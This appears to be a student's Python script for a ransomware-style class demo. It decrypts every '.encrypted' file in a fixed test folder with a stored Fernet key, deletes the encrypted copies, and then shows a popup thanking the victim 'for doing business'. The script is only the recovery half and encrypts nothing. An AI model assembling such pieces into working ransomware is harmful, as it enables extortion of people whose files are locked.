# Imports
import ctypes
import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox

# Read symmetric key from a file
with open("smem-enc", "rb") as key:
# Save key and make Fernet cipher object with symmetric key for decryption
    symm_key = key.read()
fernet_cipher = Fernet(symm_key)
# Directory where encrypted files are located
dir = r'C:\Users\Kel\Desktop\440final\test'
# Decrypt all files in directory
# Loop through files
for file_name in os.listdir(dir):
    path = os.path.join(dir, file_name)
    # Check if file ends with '.encrypted'
    if os.path.isfile(path) and file_name.endswith(".encrypted"):
        # Read file contents
        with open(path, "rb") as file:
            encrypt_text = file.read()
        # Decrypt content
        txt = fernet_cipher.decrypt(encrypt_text)
        # Remove '.encrypted' extension and create path where decrypted file will be saved
        decrypted_name = os.path.splitext(file_name)[0]
        decrypted_path = os.path.join(dir, decrypted_name)
        with open(decrypted_path, "wb") as decrypted_file:
            # Write decrypted content to new file
            decrypted_file.write(txt)
        # Delete original encrypted file
        os.remove(path)

# Popup message
def funny_popup():
    popup = tk.Tk()
    messagebox.showwarning("ATTENTION","thanks for doing business")

# Call popup
funny_popup()